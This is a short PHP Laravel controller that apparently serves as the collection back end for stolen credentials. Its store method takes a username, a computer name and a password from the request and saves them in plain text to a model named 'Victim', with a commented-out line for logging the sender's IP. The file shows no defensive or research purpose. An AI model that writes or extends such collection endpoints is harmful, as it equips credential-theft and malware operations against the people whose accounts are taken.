<?php

namespace App\Http\Controllers;

use App\Model\Victim;
use Illuminate\Http\Request;

class DataController extends Controller
{
    public function store($para1, $para2, $para3)
    {
        $ip = $_SERVER['REMOTE_ADDR'];
        $Store = new Victim();
        $Store->username = $para1;
        $Store->computername = $para2;
        $Store->password = $para3;
      //  $Store->ip = $ip;
        $Store->save();

    }
}
